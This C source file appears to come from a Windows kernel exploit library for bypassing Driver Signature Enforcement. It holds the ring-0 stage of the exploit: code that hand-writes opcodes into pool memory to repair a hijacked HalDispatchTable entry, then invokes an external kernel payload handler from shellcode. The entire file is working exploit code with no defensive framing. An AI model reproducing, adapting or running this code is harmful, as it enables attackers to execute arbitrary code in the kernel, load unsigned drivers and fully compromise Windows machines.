#include "stdafx.h"
#include "libdsebypass.h"
#include "shellcode.h"
#include "common.h"


// make crt functions inline
#pragma intrinsic(memcpy)

KERNEL_EXPL_CONTEXT m_Context;
//--------------------------------------------------------------------------------------
void WINAPI _r0_proc_begin(PKERNEL_EXPL_CONTEXT pContext, PVOID ShellcodeAddr)
{

#if defined(_X86_)

#define TEMP_CODE_LEN 8

	char TempCode[] =
	{
		'\xB8', '\x01', '\x00', '\x00', '\xC0',  // mov      eax, 0xC00000001 
		'\xC2', '\x1C', '\x00'                   // retn     0x1C
	};

#elif defined(_AMD64_)            

#define TEMP_CODE_LEN 6

	char TempCode[] =
	{
		'\xB8', '\x01', '\x00', '\x00', '\xC0',  // mov      eax, 0xC00000001 
		'\xC3'                                   // retn
	};

#endif

	// allocate code buffer to restore HAL_DISPATCH::HalQuerySystemInformation pointer
	if (pContext->HalDispatchTable->HalQuerySystemInformation = pContext->f_ExAllocatePool(NonPagedPool, TEMP_CODE_LEN))
	{
		memcpy(pContext->HalDispatchTable->HalQuerySystemInformation, TempCode, TEMP_CODE_LEN);
	}

	if (pContext->Handler)
	{
		if (ShellcodeAddr)
		{
			// switch handler to the copied code
			pContext->Handler = (KERNEL_EXPL_HANDLER)RVATOVA(ShellcodeAddr, pContext->Handler);
		}

		// call external ring0 payload handler
		pContext->Handler(pContext->HandlerContext);
	}

	pContext->bExplOk = TRUE;
}
//--------------------------------------------------------------------------------------
void WINAPI _r0_proc_end(void)
{
	return;
}
//--------------------------------------------------------------------------------------
void WINAPI _r0_proc_continue(void)
{
	_r0_proc_begin(&m_Context, NULL);
}
//--------------------------------------------------------------------------------------
// EoF